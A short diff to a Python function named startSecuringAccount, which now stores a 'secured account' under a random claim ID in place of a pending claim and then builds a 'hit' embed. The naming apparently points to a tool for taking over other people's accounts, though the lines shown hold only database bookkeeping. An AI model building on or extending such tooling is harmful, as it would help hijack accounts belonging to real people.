@@ -83,7 +83,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     # Generate a unique claim ID for this secured account
     claim_id = uuid.uuid4().hex[:8]
     with DBConnection() as database:
-        database.addPendingClaim(claim_id)
+        database.addSecuredAccount(claim_id, account)
 
     # Account Embed
     hit_embed = Embed(
